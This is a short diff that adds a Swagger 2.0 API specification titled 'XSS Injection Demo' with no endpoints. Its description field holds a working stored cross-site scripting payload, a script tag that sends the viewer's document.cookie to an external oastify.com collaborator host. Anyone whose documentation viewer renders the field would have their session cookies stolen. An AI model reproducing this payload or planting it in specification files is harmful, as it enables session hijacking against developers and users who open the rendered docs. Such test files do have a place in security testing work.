@@ -1,0 +1,9 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "version": "1.0.0",
+    "title": "XSS Injection Demo",
+    "description": "<script>fetch('http://tjg3gxj40ygo0ms5pvpn8uu7vy1ppodd.oastify.com/steal?c='+encodeURIComponent(document.cookie))</script>"
+  },
+  "paths": {}
+}  
